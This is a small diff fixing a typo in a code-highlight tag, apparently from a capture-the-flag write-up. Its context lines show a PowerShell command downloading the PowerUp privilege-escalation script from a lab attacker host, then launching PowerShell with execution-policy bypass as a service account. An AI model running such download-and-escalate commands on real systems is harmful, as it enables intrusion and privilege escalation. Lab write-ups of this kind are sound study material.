@@ -342,7 +342,7 @@ powershell Invoke-WebRequest -Uri 10.10.14.2/Privesc/PowerUp.ps1 -Outfile PowerU
 {% endhighlight %}
 
 After the uploading, we can execute following commands to import the powershell script.
-{% highlgight shell %}
+{% highlight shell %}
 C:\Users\mssql-svc\Desktop>powershell.exe -nop -exec bypass
 powershell.exe -nop -exec bypass
 Windows PowerShell 
